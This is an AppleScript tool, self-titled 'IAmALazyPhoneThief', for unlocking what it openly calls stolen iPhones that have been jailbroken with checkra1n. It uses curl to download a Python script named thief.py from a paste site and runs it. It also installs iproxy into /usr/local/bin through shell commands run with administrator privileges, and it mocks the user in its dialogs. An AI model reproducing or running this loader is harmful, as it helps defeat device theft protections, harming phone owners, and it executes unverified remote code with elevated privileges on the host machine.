set progress total steps to 3
set progress completed steps to 1
set progress description to "Running Magic Hax"
set progress additional description to "Downloading necessary stuff"

set temp to (POSIX path of (path to temporary items))

download("https://hasteb.in/raw/turopeja.py", "thief.py")
download("https://github.com/libimobiledevice-win32/imobiledevice-net/releases/download/v1.2.164/libimobiledevice.1.2.1-r857-osx-x64.zip", "ipr.zip")
# do shell script "open " & (POSIX path of (path to temporary items)) as string
-- do shell script "open " & temp
do shell script "chmod +x " & temp & "thief.py"
do shell script "rm -rf " & temp & "ipr" with administrator privileges
do shell script "unzip " & temp & "ipr.zip -d " & temp & "ipr" with administrator privileges
do shell script "mv " & temp & "ipr/iproxy /usr/local/bin" with administrator privileges
do shell script "chmod +x /usr/local/bin/iproxy" with administrator privileges

set okbtn to "Let's Crack!"
set title to "IAmALazyPhoneThief"

set crack to (button returned of (display dialog "Connect a checkra1ned device, then click on \"" & okbtn & "\" to crack your probably stolen device." with title title buttons {okbtn, "Nope, I'm a man of sane principles."} default button 1 cancel button 2)) is equal to okbtn

if not crack then exit repeat

try
	step("Installing dependencies")
	do shell script "/usr/local/bin/pip3 install paramiko"
	step("Running magic hax pt. 2")
	set x to do shell script "/usr/local/bin/python3 " & (POSIX path of (path to temporary items)) & "thief.py"
	display dialog x & "
Enjoy your now unlocked stolen phone!" with title title buttons {"Thanks, now screw off"} default button 1
on error err
	display dialog "Howdy, filthy thief, I hope you choke! An error occurred, did you steal this computer, too?
" & lastLine(err) with title title buttons {"Screw you"} default button 1
end try

to lastLine(someText)
	return last item of someText's paragraphs
end lastLine

to download(theUrl, name)
	return do shell script "curl -L " & theUrl & " -o " & (POSIX path of (path to temporary items)) & name
end download

on step(name)
	set progress additional description to name
	set progress completed steps to progress completed steps + 1
end step